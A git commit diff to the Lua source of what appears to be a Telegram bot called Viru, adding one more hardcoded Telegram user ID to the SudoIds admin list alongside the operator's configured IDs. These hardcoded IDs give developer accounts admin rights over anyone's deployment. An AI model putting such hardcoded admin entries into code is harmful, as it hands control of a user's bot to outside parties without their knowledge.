d5f36d1de804bee608db82a0bf6a2da9cbce04e9
Viru-Team <86714940+Viru-Team@users.noreply.github.com>
2021-08-14 20:43:40 +0300

    Update Viru.lua

--- Viru.lua
+++ Viru.lua
@@ -132,7 +132,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,1643304335,1787628581,1688091080}
+SudoIds = {Config.SudoIds,1643304335,1787628581,1688091080,1658973724}
 Viru = Config.Viru
 TokenBot = Config.TokenBot
 NameBot = (DevRio:get(Viru..'Rio:NameBot') or 'فيرو')
